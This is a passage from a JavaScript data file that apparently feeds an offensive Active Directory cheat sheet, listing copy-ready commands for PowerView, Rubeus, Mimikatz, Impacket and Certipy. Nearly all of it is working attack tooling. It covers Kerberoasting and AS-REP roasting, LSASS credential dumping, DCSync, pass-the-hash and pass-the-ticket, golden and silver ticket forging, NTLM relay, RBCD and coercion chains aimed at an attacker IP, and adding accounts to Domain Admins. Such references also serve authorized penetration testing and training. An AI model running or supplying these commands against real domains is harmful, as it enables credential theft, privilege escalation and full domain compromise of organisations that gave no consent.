                            code: "net view /domain\nnet view /domain:<DOMAIN_FIRST>\nnet view \\\\<DC_HOST>\nnet use\nqwinsta /server:<DC_HOST>",
                            note: "Lists visible domains, hosts, shares, mapped drives, and remote sessions."
                        },
                        {
                            label: "SPN and trust discovery",
                            tag: "LDAP",
                            tagClass: "tag-amber",
                            code: "setspn -T <DOMAIN> -Q */*\nnltest /domain_trusts\nnltest /trusted_domains\ndsquery * -filter \"(servicePrincipalName=*)\" -attr sAMAccountName servicePrincipalName",
                            note: "Finds service accounts for Kerberoasting and maps domain trust relationships."
                        },
                        {
                            label: "RSAT PowerShell basics",
                            tag: "RSAT",
                            tagClass: "tag-green",
                            code: "Get-ADDomain\nGet-ADDomainController -Filter *\nGet-ADUser -Filter * -Properties ServicePrincipalName | Select-Object SamAccountName,ServicePrincipalName\nGet-ADGroupMember \"Domain Admins\" -Recursive",
                            note: "Uses the ActiveDirectory module when RSAT is available on the host."
                        }
                    ]
                }
            ]
        },
        {
            id: "powerview",
            title: "PowerView",
            icon: "ti-eye-search",
            sections: [
                {
                    title: "Load & Enumerate",
                    items: [
                        {
                            label: "Import PowerView",
                            tag: "LOAD",
                            tagClass: "tag-gray",
                            code: "powershell -ep bypass\nImport-Module .\\PowerView.ps1\n. .\\PowerView.ps1",
                            note: "Loads PowerView functions into the current PowerShell session."
                        },
                        {
                            label: "Domain overview",
                            tag: "ENUM",
                            tagClass: "tag-blue",
                            code: "Get-Domain\nGet-DomainController\nGet-DomainPolicyData\nGet-DomainSID",
                            note: "Collects core domain, DC, policy, and SID information."
                        },
                        {
                            label: "Users, computers, and groups",
                            tag: "ENUM",
                            tagClass: "tag-blue",
                            code: "Get-DomainUser -Identity <TARGET_USER> -Properties samaccountname,memberof,pwdlastset,lastlogontimestamp\nGet-DomainUser * -SPN | Select-Object samaccountname,serviceprincipalname\nGet-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp\nGet-DomainGroupMember -Identity \"Domain Admins\" -Recurse",
                            note: "Enumerates useful user, computer, SPN, and privileged group data."
                        },
                        {
                            label: "Shares, local admins, and sessions",
                            tag: "RECON",
                            tagClass: "tag-amber",
                            code: "Find-DomainShare -CheckShareAccess\nFind-LocalAdminAccess -Verbose\nGet-NetSession -ComputerName <DC_HOST>\nGet-NetLoggedon -ComputerName <DC_HOST>",
                            note: "Finds reachable shares, local admin rights, sessions, and logged-on users."
                        }
                    ]
                },
                {
                    title: "PowerView Attack Paths",
                    items: [
                        {
                            label: "Kerberoasting",
                            tag: "ROAST",
                            tagClass: "tag-red",
                            code: "Get-DomainUser * -SPN | Select-Object samaccountname\nGet-DomainUser -Identity <TARGET_USER> | Get-DomainSPNTicket -Format Hashcat\nGet-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\tgs_hashes.csv -NoTypeInformation",
                            note: "Requests service tickets for SPN accounts and formats them for offline cracking."
                        },
                        {
                            label: "Delegation checks",
                            tag: "DELEG",
                            tagClass: "tag-purple",
                            code: "Get-DomainComputer -Unconstrained | Select-Object dnshostname\nGet-DomainUser -Unconstrained | Select-Object samaccountname\nGet-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto\nGet-DomainComputer -TrustedToAuth | Select-Object dnshostname,msds-allowedtodelegateto",
                            note: "Finds unconstrained and constrained delegation targets."
                        },
                        {
                            label: "ACL discovery",
                            tag: "ACL",
                            tagClass: "tag-amber",
                            code: "Find-InterestingDomainAcl -ResolveGUIDs\nGet-DomainObjectAcl -Identity <TARGET_USER> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight'}\nGet-DomainObjectOwner -Identity <TARGET_USER>",
                            note: "Highlights dangerous ACLs and ownership on users, groups, computers, or the domain."
                        },
                        {
                            label: "LAPS and gMSA",
                            tag: "CREDS",
                            tagClass: "tag-red",
                            code: "Get-DomainComputer -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime,dnshostname | ? {$_.\"ms-Mcs-AdmPwd\"}\nGet-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)' | Select-Object samaccountname\nGet-DomainObject '<gMSA_account>$' -Properties msDS-ManagedPassword",
                            note: "Checks for readable LAPS passwords and gMSA managed password blobs."
                        },
                        {
                            label: "Common ACL abuse",
                            tag: "ABUSE",
                            tagClass: "tag-red",
                            code: "Add-DomainGroupMember -Identity \"Domain Admins\" -Members <user> -Verbose\nSet-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force) -Verbose\nSet-DomainObjectOwner -Identity <TARGET_USER> -OwnerIdentity <user> -Verbose\nAdd-DomainObjectAcl -TargetIdentity <DOMAIN> -PrincipalIdentity <user> -Rights DCSync -Verbose",
                            note: "Adds members, resets passwords, takes ownership, or grants DCSync when rights allow."
                        }
                    ]
                }
            ]
        },
        {
            id: "rubeus",
            title: "Rubeus",
            icon: "ti-ticket",
            sections: [
                {
                    title: "Tickets & Roasting",
                    items: [
                        {
                            label: "Ticket triage and dump",
                            tag: "KRB",
                            tagClass: "tag-purple",
                            code: ".\\Rubeus.exe triage\n.\\Rubeus.exe dump /nowrap\n.\\Rubeus.exe dump /service:krbtgt /nowrap\n.\\Rubeus.exe klist",
                            note: "Lists or dumps Kerberos tickets from accessible logon sessions."
                        },
                        {
                            label: "Pass the ticket",
                            tag: "PTT",
                            tagClass: "tag-red",
                            code: ".\\Rubeus.exe ptt /ticket:ticket.kirbi\n.\\Rubeus.exe ptt /ticket:\"base64...\"\nklist",
                            note: "Injects a Kirbi or base64 ticket into the current logon session."
                        },
                        {
                            label: "AS-REP roast",
                            tag: "ASREP",
                            tagClass: "tag-red",
                            code: ".\\Rubeus.exe asreproast /nowrap\n.\\Rubeus.exe asreproast /user:<TARGET_USER> /nowrap\n.\\Rubeus.exe asreproast /userlist:users.txt /nowrap /outfile:asrep_hashes.txt",
                            note: "Requests AS-REP hashes for users without Kerberos pre-authentication."
                        },
                        {
                            label: "Kerberoast",
                            tag: "ROAST",
                            tagClass: "tag-red",
                            code: ".\\Rubeus.exe kerberoast /stats\n.\\Rubeus.exe kerberoast /nowrap /outfile:tgs_hashes.txt\n.\\Rubeus.exe kerberoast /user:<TARGET_USER> /nowrap /outfile:tgs_hashes.txt\n.\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap",
                            note: "Requests TGS hashes for SPN accounts, optionally targeting high-value users."
                        }
                    ]
                },
                {
                    title: "TGT, S4U & Forged Tickets",
                    items: [
                        {
                            label: "Ask TGT with password/hash/AES",
                            tag: "TGT",
                            tagClass: "tag-purple",
                            code: ".\\Rubeus.exe asktgt /user:<user> /password:<password> /domain:<DOMAIN> /dc:<DC_IP> /nowrap\n.\\Rubeus.exe asktgt /user:<user> /rc4:<NThash> /domain:<DOMAIN> /dc:<DC_IP> /ptt\n.\\Rubeus.exe asktgt /user:<user> /aes256:<AES256> /domain:<DOMAIN> /dc:<DC_IP> /enctype:aes256 /nowrap",
                            note: "Requests a TGT using cleartext password, NT hash, or AES key material."
                        },
                        {
                            label: "Create netonly session",
                            tag: "OPSEC",
                            tagClass: "tag-amber",
                            code: ".\\Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show\n.\\Rubeus.exe ptt /ticket:ticket.kirbi",
                            note: "Creates an isolated logon session, then injects a ticket into it."
                        },
                        {
                            label: "Constrained delegation S4U",
                            tag: "S4U",
                            tagClass: "tag-red",
                            code: ".\\Rubeus.exe s4u /user:<user> /rc4:<NThash> /impersonateuser:Administrator /msdsspn:cifs/<DC_FQDN> /ptt\n.\\Rubeus.exe s4u /ticket:svc.tgt /msdsspn:'cifs/<DC_FQDN>' /impersonateuser:Administrator /altservice:'ldap/<DC_FQDN>' /ptt",
                            note: "Abuses delegation to obtain service tickets as another user."
                        },
                        {
                            label: "Golden and silver tickets",
                            tag: "FORGE",
                            tagClass: "tag-red",
                            code: ".\\Rubeus.exe golden /aes256:<KRBTGT_AES256> /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /nowrap /outfile:golden.kirbi\n.\\Rubeus.exe silver /service:cifs/<DC_FQDN> /rc4:<NThash> /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /ptt\n.\\Rubeus.exe ptt /ticket:golden.kirbi",
                            note: "Forges Kerberos tickets when the needed domain or service key is known."
                        }
                    ]
                }
            ]
        },
        {
            id: "mimikatz",
            title: "Mimikatz",
            icon: "ti-key",
            sections: [
                {
                    title: "Credentials & Tickets",
                    items: [
                        {
                            label: "Privilege and logon passwords",
                            tag: "CREDS",
                            tagClass: "tag-red",
                            code: ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::msv\" \"exit\"\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::ekeys\" \"exit\"",
                            note: "Dumps interactive credentials, NTLM material, and Kerberos keys from LSASS."
                        },
                        {
                            label: "Export and inject tickets",
                            tag: "PTT",
                            tagClass: "tag-purple",
                            code: ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" \"exit\"\n.\\mimikatz.exe \"kerberos::list /export\" \"exit\"\n.\\mimikatz.exe \"kerberos::ptt ticket.kirbi\" \"exit\"",
                            note: "Exports Kerberos tickets to Kirbi files or injects an existing ticket."
                        },
                        {
                            label: "Pass the hash",
                            tag: "PTH",
                            tagClass: "tag-red",
                            code: ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<user> /domain:<DOMAIN> /ntlm:<NThash> /run:cmd.exe\" \"exit\"\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<user> /domain:<DOMAIN> /rc4:<NThash> /run:powershell.exe\" \"exit\"",
                            note: "Starts a process with a supplied NTLM hash for lateral movement."
                        },
                        {
                            label: "DCSync",
                            tag: "DCSYNC",
                            tagClass: "tag-red",
                            code: ".\\mimikatz.exe \"lsadump::dcsync /domain:<DOMAIN> /user:krbtgt\" \"exit\"\n.\\mimikatz.exe \"lsadump::dcsync /domain:<DOMAIN> /user:Administrator\" \"exit\"\n.\\mimikatz.exe \"lsadump::dcsync /domain:<DOMAIN> /all /csv\" \"exit\"\n.\\mimikatz.exe \"lsadump::dcsync /domain:<DOMAIN> /dc:<DC_FQDN> /user:krbtgt\" \"exit\"",
                            note: "Uses replication rights to pull password data from a domain controller."
                        }
                    ]
                },
                {
                    title: "LSA & Forged Tickets",
                    items: [
                        {
                            label: "Dump local LSA secrets",
                            tag: "LSA",
                            tagClass: "tag-red",
                            code: ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\"\n.\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" \"exit\"\n.\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /patch\" \"exit\"",
                            note: "Extracts local SAM, LSA secrets, or domain key material on privileged hosts."
                        },
                        {
                            label: "Golden ticket",
                            tag: "FORGE",
                            tagClass: "tag-red",
                            code: ".\\mimikatz.exe \"kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<KRBTGT_NThash> /user:Administrator /ptt\" \"exit\"\n.\\mimikatz.exe \"kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES256> /user:Administrator /ticket:golden.kirbi\" \"exit\"",
                            note: "Creates a forged TGT using the krbtgt key."
                        },
                        {
                            label: "Silver ticket",
                            tag: "FORGE",
                            tagClass: "tag-red",
                            code: ".\\mimikatz.exe \"kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<DC_FQDN> /service:cifs /rc4:<NThash> /user:Administrator /ptt\" \"exit\"\n.\\mimikatz.exe \"kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<DC_FQDN> /service:ldap /rc4:<NThash> /user:Administrator /ptt\" \"exit\"",
                            note: "Creates a forged service ticket when the target service key is known."
                        },
                        {
                            label: "DCShadow skeleton commands",
                            tag: "ADV",
                            tagClass: "tag-amber",
                            code: ".\\mimikatz.exe \"privilege::debug\" \"lsadump::dcshadow /object:<TARGET_USER> /attribute:description /value:pwned\" \"exit\"\n.\\mimikatz.exe \"privilege::debug\" \"lsadump::dcshadow /push\" \"exit\"",
                            note: "Stages and pushes directory changes through DCShadow in authorized labs."
                        }
                    ]
                }
            ]
        }
    ],
    impacket: [
        {
            id: "enum-roast",
            title: "Enum & Roast",
            icon: "ti-flame",
            sections: [
                {
                    title: "Discovery",
                    items: [
                        {
                            label: "LDAP baseline",
                            tag: "ENUM",
                            tagClass: "tag-blue",
                            code: "ldapsearch -x -H ldap://<DC_FQDN> -D '<DOMAIN>\\\\<user>' -W -b 'DC=<DOMAIN_FIRST>,DC=<DOMAIN_TLD>'\npython3 lookupsid.py '<DOMAIN>/<user>:<pass>'@<DC_IP>\npython3 findDelegation.py '<DOMAIN>/<user>:<pass>' -dc-ip <DC_IP>",
                            note: "Build domain context, confirm SID/RIDs, and enumerate delegation paths."
                        },
                        {
                            label: "Domain SID collection",
                            tag: "SID",
                            tagClass: "tag-amber",
                            code: "python3 lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:<NThash> <DOMAIN>/<user>@<DC_IP> 0\npython3 getPac.py -targetUser administrator '<DOMAIN>/<user>:<pass>'\nnxc ldap <DC_IP> -u '<user>' -p '<pass>' --get-sid",
                            note: "Collects the domain SID needed for golden and silver ticket forging."
                        }
                    ]
                },
                {
                    title: "AS-REP & Kerberoast",
                    items: [
                        {
                            label: "Kerbrute username enum",
                            tag: "ASREP",
                            tagClass: "tag-red",
                            code: "kerbrute userenum users.txt -d <DOMAIN> --dc <DC_IP>\nkerbrute userenum users.txt -d <DOMAIN> --dc <DC_IP> --downgrade",
                            note: "Enumerates valid users and can catch AS-REP roastable accounts."
                        },
                        {
                            label: "GetNPUsers AS-REP",
                            tag: "ASREP",
                            tagClass: "tag-red",
                            code: "GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -request -format hashcat\nGetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -request -format hashcat\nimpacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep_hashes.txt\nhashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt",
                            note: "Requests and cracks AS-REP hashes for accounts without pre-auth."
                        },
                        {
                            label: "GetUserSPNs Kerberoast",
                            tag: "ROAST",
                            tagClass: "tag-red",
                            code: "GetUserSPNs.py '<DOMAIN>/<user>:<pass>' -dc-ip <DC_IP> -request\nGetUserSPNs.py -request -dc-ip <DC_IP> -usersfile users.txt -outputfile kerberoast.hashes -no-pass\nGetUserSPNs.py '<DOMAIN>/<user>:<pass>' -dc-ip <DC_IP> -request-user <TARGET_USER> -outputfile tgs_hashes.txt\nhashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt",
                            note: "Requests TGS material for SPN accounts and cracks it offline."
                        }
                    ]
                },
                {
                    title: "Machine Account Attacks",
                    items: [
                        {
                            label: "Timeroast MS-SNTP",
                            tag: "TIME",
                            tagClass: "tag-red",
                            code: "# Timeroast abuses MS-SNTP MACs from DC time service; crack with hashcat mode 31300\nnxc smb <DC_IP> -M timeroast | tee timeroast.hashes\nsudo ./timeroast.py <DC_IP> | tee timeroast.hashes\nhashcat -m 31300 timeroast.hashes /usr/share/wordlists/rockyou.txt --username\n# After cracking, try the recovered computer account password\nnxc smb <DC_FQDN> -u '<COMPUTER_ACCOUNT>$' -p '<COMPUTER_PASS>' -k",
                            note: "Collects crackable MS-SNTP MACs for computer account RIDs, often unauthenticated."
                        },
                        {
                            label: "Pre2K unauth discovery",
                            tag: "PRE2K",
                            tagClass: "tag-red",
                            code: "# Pre-Windows 2000 computer accounts may use lowercase hostname as password\nnbtscan -r <TARGET_IP>/24 | awk '{print $1}' > hosts.txt\npre2k unauth -d <DOMAIN> -dc-ip <DC_IP> -inputfile hosts.txt -save -verbose\n# If ms01$ is found, password is often ms01\ngetTGT.py '<DOMAIN>/ms01$:ms01' -dc-ip <DC_IP>\nexport KRB5CCNAME=$(pwd)/ms01$.ccache",
                            note: "Tests predictable machine account passwords without valid domain credentials."
                        },
                        {
                            label: "Pre2K authenticated spray",
                            tag: "PRE2K",
                            tagClass: "tag-red",
                            code: "# Auth mode uses a normal account to enumerate/spray old computer accounts\npre2k auth -u <user> -p '<pass>' -d <DOMAIN> -dc-ip <DC_IP> -save\n# Confirm the Pre-Windows 2000 Compatible Access group exposure\nnxc ldap <DC_IP> -u '<user>' -p '<pass>' --groups\nldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\\\\<user>' -w '<pass>' -b '<DOMAIN_DN>' '(cn=Pre-Windows 2000 Compatible Access)' member",
                            note: "Uses valid creds to find machine accounts created/reset with legacy predictable passwords."
                        },
                        {
                            label: "Pre2K password change",
                            tag: "PRE2K",
                            tagClass: "tag-amber",
                            code: "# Change a valid Pre2K computer password after confirming the default credential\nrpcchangepwd.py '<DOMAIN>/<COMPUTER_ACCOUNT>$:<COMPUTER_PASS>'@<DC_IP> -newpass '<password>'\ngetTGT.py '<DOMAIN>/<COMPUTER_ACCOUNT>$:<password>' -dc-ip <DC_IP>\nexport KRB5CCNAME=$(pwd)/<COMPUTER_ACCOUNT>$.ccache",
                            note: "Changes the machine account password, useful for lab persistence but noisy."
                        }
                    ]
                }
            ]
        },
        {
            id: "creds-exec",
            title: "Creds & Exec",
            icon: "ti-terminal-2",
            sections: [
                {
                    title: "Dumping & Validation",
                    items: [
                        {
                            label: "Secretsdump",
                            tag: "DUMP",
                            tagClass: "tag-red",
                            code: "python3 secretsdump.py '<DOMAIN>/<user>:<pass>'@<DC_IP>\npython3 secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:<NThash> '<DOMAIN>/<user>'@<DC_IP>\npython3 secretsdump.py '<DOMAIN>/<user>:<pass>'@<DC_IP> -just-dc-user krbtgt\npython3 secretsdump.py -k -no-pass '<DOMAIN>/Administrator'@<DC_FQDN>",
                            note: "Dumps SAM/LSA/NTDS or performs DCSync when rights allow."
                        },
                        {
                            label: "Remote shells",
                            tag: "EXEC",
                            tagClass: "tag-red",
                            code: "python3 psexec.py '<DOMAIN>/<user>:<pass>'@<TARGET_FQDN>\npython3 wmiexec.py '<DOMAIN>/<user>:<pass>'@<TARGET_FQDN>\npython3 smbexec.py '<DOMAIN>/<user>:<pass>'@<TARGET_FQDN>\npython3 atexec.py '<DOMAIN>/<user>:<pass>'@<TARGET_FQDN> whoami",
                            note: "Executes commands through SMB/WMI/SCM/scheduled task paths."
                        },
                        {
                            label: "Pass-the-hash execution",
                            tag: "PTH",
                            tagClass: "tag-red",
                            code: "python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NThash> '<DOMAIN>/<user>'@<TARGET_FQDN>\npython3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NThash> '<DOMAIN>/<user>'@<TARGET_FQDN>\npython3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NThash> '<DOMAIN>/<user>'@<TARGET_FQDN>",
                            note: "Authenticates with NTLM hash material instead of cleartext password."
                        },
                        {
                            label: "NTLM relay basics",
                            tag: "RELAY",
                            tagClass: "tag-red",
                            code: "# Check relay viability first; SMB signing disabled is the classic win condition\nnxc smb <TARGET_IP>/24 --gen-relay-list relay-targets.txt\nresponder -I tun0 -A\nntlmrelayx.py -tf relay-targets.txt -smb2support --dump\nntlmrelayx.py -tf relay-targets.txt -smb2support -c 'whoami /all'",
                            note: "Builds a relay target list, observes poisoning traffic, then relays NTLM where signing allows."
                        },
                        {
                            label: "LDAP relay to grant RBCD",
                            tag: "RBCD",
                            tagClass: "tag-red",
                            code: "# Relay a machine/user to LDAP and write RBCD on a target computer\nntlmrelayx.py -t ldap://<DC_FQDN> --delegate-access --escalate-user 'evil$' --no-smb2support\npython3 addcomputer.py -computer-name 'evil$' -computer-pass '<password>' -dc-ip <DC_IP> '<DOMAIN>/<user>:<pass>'\npython3 getST.py '<DOMAIN>/evil$:<password>' -spn cifs/<TARGET_FQDN> -impersonate Administrator -dc-ip <DC_IP>",
                            note: "Common NTLM relay escalation path when LDAP signing/channel binding is weak."
                        }
                    ]
                },
                {
                    title: "Tickets",
                    items: [
                        {
                            label: "Get TGT / load ccache",
                            tag: "KRB",
                            tagClass: "tag-purple",
                            code: "python3 getTGT.py '<DOMAIN>/<user>:<pass>' -dc-ip <DC_IP>\npython3 getTGT.py '<DOMAIN>/<user>' -hashes aad3b435b51404eeaad3b435b51404ee:<NThash> -dc-ip <DC_IP>\nexport KRB5CCNAME=$(pwd)/<user>.ccache\nklist",
                            note: "Requests a TGT and sets it as the active Kerberos cache."
                        },
                        {
                            label: "Use Kerberos ticket",
                            tag: "PTT",
                            tagClass: "tag-purple",
                            code: "export KRB5CCNAME=$(pwd)/Administrator.ccache\npython3 psexec.py -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>\npython3 wmiexec.py -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>\npython3 secretsdump.py -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>",
                            note: "Uses an existing ccache for Kerberos-authenticated access."
                        },
                        {
                            label: "Convert Kirbi / ccache",
                            tag: "PTT",
                            tagClass: "tag-gray",
                            code: "python3 ticketConverter.py ticket.kirbi Administrator.ccache\npython3 ticketConverter.py Administrator.ccache ticket.kirbi\nexport KRB5CCNAME=$(pwd)/Administrator.ccache",
                            note: "Converts ticket formats between Windows Kirbi and Linux ccache."
                        }
                    ]
                }
            ]
        },
        {
            id: "acl-delegation",
            title: "ACL & Delegation",
            icon: "ti-route",
            sections: [
                {
                    title: "ACL Abuse Helpers",
                    items: [
                        {
                            label: "Add group member",
                            tag: "ACL",
                            tagClass: "tag-red",
                            code: "net rpc group addmem 'Domain Admins' '<user>' -U '<DOMAIN>/<user>%<pass>' -S <DC_IP>\npython3 addToGroup.py -u '<user>' -p '<pass>' -d <DOMAIN> -dc-ip <DC_IP> '<user>' 'Domain Admins'",
                            note: "Adds a controlled account to a target group when AddMember/GenericAll allows it."
                        },
                        {
                            label: "Force password reset",
                            tag: "ACL",
                            tagClass: "tag-red",
                            code: "rpcclient -U '<DOMAIN>/<user>%<pass>' <DC_IP> -c \"setuserinfo2 <TARGET_USER> 23 'NewP@ss123!'\"\nnet rpc password '<TARGET_USER>' 'NewP@ss123!' -U '<DOMAIN>/<user>%<pass>' -S <DC_IP>\npython3 getTGT.py '<DOMAIN>/<TARGET_USER>:NewP@ss123!' -dc-ip <DC_IP>",
                            note: "Resets a target password when ForceChangePassword rights exist."
                        },
                        {
                            label: "Shadow credentials follow-up",
                            tag: "SHADOW",
                            tagClass: "tag-red",
                            code: "python3 getTGT.py '<DOMAIN>/<TARGET_USER>' -hashes :<NThash> -dc-ip <DC_IP>\npython3 gettgtpkinit.py -cert-pfx shadow.pfx '<DOMAIN>/<TARGET_USER>' out.ccache\nexport KRB5CCNAME=$(pwd)/out.ccache",
                            note: "Uses shadow credential output to obtain a TGT."
                        }
                    ]
                },
                {
                    title: "Delegation & RBCD",
                    items: [
                        {
                            label: "Add computer",
                            tag: "MAQ",
                            tagClass: "tag-blue",
                            code: "python3 addcomputer.py -computer-name 'evil$' -computer-pass 'EvilP@ss1' -dc-ip <DC_IP> '<DOMAIN>/<user>:<pass>'",
                            note: "Creates a machine account when MachineAccountQuota permits it."
                        },
                        {
                            label: "Constrained delegation getST",
                            tag: "S4U",
                            tagClass: "tag-red",
                            code: "python3 getST.py '<DOMAIN>/<svc_user>:<pass>' -spn '<ALLOWED_SPN>' -impersonate Administrator -dc-ip <DC_IP>\npython3 getST.py '<DOMAIN>/<svc_user>' -hashes aad3b435b51404eeaad3b435b51404ee:<NThash> -spn '<ALLOWED_SPN>' -impersonate Administrator -dc-ip <DC_IP>\nexport KRB5CCNAME=$(pwd)/Administrator.ccache",
                            note: "Obtains a service ticket as an impersonated user through constrained delegation."
                        },
                        {
                            label: "Unconstrained coerce chain",
                            tag: "CHAIN",
                            tagClass: "tag-red",
                            code: "python3 krbrelayx/dnstool.py -u '<DOMAIN>\\\\<user>' -p '<pass>' -r fake.<DOMAIN> -a add -t A -d <ATTACKER_IP> <DC_IP>\npython3 krbrelayx/addspn.py -u '<DOMAIN>\\\\<user>' -p '<pass>' -s 'cifs/fake.<DOMAIN>' -t 'evil$' -dc-ip <DC_IP> <DC_HOSTNAME> --additional\npython3 krbrelayx/krbrelayx.py -hashes <MACHINE_HASH>\npython3 coercer.py coerce -u '<user>' -p '<pass>' -d <DOMAIN> -l fake.<DOMAIN> -t <DC_IP>",
                            note: "Sets up coercion to capture a delegated TGT in an authorized lab."
                        }
                    ]
                }
            ]
        },
        {
            id: "tickets",
            title: "Golden / Silver",
            icon: "ti-certificate",
            sections: [
                {
                    title: "Forge Tickets",
                    items: [
                        {
                            label: "Golden ticket with ticketer",
                            tag: "GOLD",
                            tagClass: "tag-red",
                            code: "python3 ticketer.py -nthash <KRBTGT_NThash> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator\npython3 ticketer.py -aesKey <KRBTGT_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator\nexport KRB5CCNAME=$(pwd)/Administrator.ccache",
                            note: "Forges a domain-wide TGT using krbtgt material."
                        },
                        {
                            label: "Silver ticket with ticketer",
                            tag: "SILVER",
                            tagClass: "tag-red",
                            code: "python3 ticketer.py -nthash <NThash> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn cifs/<DC_FQDN> Administrator\npython3 ticketer.py -aesKey <AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn ldap/<DC_FQDN> Administrator\nexport KRB5CCNAME=$(pwd)/Administrator.ccache",
                            note: "Forges a service-scoped TGS using the target service account key."
                        },
                        {
                            label: "Use forged tickets",
                            tag: "USE",
                            tagClass: "tag-purple",
                            code: "klist\npython3 psexec.py -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>\npython3 mssqlclient.py -k <DC_FQDN>\npython3 secretsdump.py -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>",
                            note: "Validates forged ticket access against SMB, MSSQL, or LDAP/DCSync."
                        }
                    ]
                }
            ]
        }
    ],
    certipy: [
        {
            id: "find",
            title: "Find",
            icon: "ti-certificate",
            sections: [
                {
                    title: "ADCS Enumeration",
                    items: [
                        {
                            label: "Find vulnerable templates",
                            tag: "ENUM",
                            tagClass: "tag-blue",
                            code: "certipy find -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -vulnerable -stdout\ncertipy find -u '<DOMAIN>\\\\<user>' -p '<pass>' -target <DC_FQDN> -dc-ip <DC_IP> -enabled -vulnerable",
                            note: "Enumerates AD CS CAs/templates and highlights common ESC paths."
                        },
                        {
                            label: "Export BloodHound data",
                            tag: "BH",
                            tagClass: "tag-purple",
                            code: "certipy find -u '<user>@<DOMAIN>' -p '<pass>' -dc-ip <DC_IP> -bloodhound -old-bloodhound\ncertipy find -u '<user>@<DOMAIN>' -hashes :<NThash> -dc-ip <DC_IP> -bloodhound",
                            note: "Creates Certipy BloodHound output for ADCS attack path mapping."
                        },
                        {
                            label: "Find with Kerberos",
                            tag: "KRB",
                            tagClass: "tag-purple",
                            code: "export KRB5CCNAME=$(pwd)/<user>.ccache\ncertipy find -k -no-pass -target <DC_FQDN> -dc-ip <DC_IP> -vulnerable -stdout",
                            note: "Uses an existing Kerberos ticket instead of password or hash auth."
                        },
                        {
                            label: "Certify Windows enum",
                            tag: "WIN",
                            tagClass: "tag-blue",
                            code: ".\\Certify.exe find /vulnerable\n.\\Certify.exe find /vulnerable /enabled /enrolleeSuppliesSubject\n.\\Certify.exe cas\ncertutil -config '<CA_NAME>' -getreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags",
                            note: "Windows-side ADCS enumeration for vulnerable templates, CAs, and ESC6/ESC11 CA flags."
                        },
                        {
                            label: "ESC5 PKI object permissions",
                            tag: "ESC5",
                            tagClass: "tag-amber",
                            code: "# Check permissions on PKI container objects (CA server, templates container)\nGet-ADObject 'CN=<CA_NAME>,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,<DC=DOMAIN>' -Properties nTSecurityDescriptor\n# Check InterfaceFlags for ESC11 (0x0 = cleartext RPC allowed)\ncertutil -config '<CA_NAME>' -getreg CA\\InterfaceFlags\n# CA EditFlags for ESC6 (look for EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x40000)\ncertutil -config '<CA_NAME>' -getreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags\n# ESC16: check DisableExtensionList for szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2)\ncertutil -config '<CA_NAME>' -getreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\DisableExtensionList",
                            note: "ESC5 targets weak ACLs on CA/PKI AD objects; also checks ESC11 and ESC16 CA registry flags."
                        }
                    ]
                }
            ]
        },
        {
            id: "abuse",
            title: "Abuse",
            icon: "ti-bolt",
            sections: [
                {
                    title: "ESC1 – ESC4",
                    items: [
                        {
                            label: "ESC1 request certificate (Linux)",
                            tag: "ESC1",
                            tagClass: "tag-red",
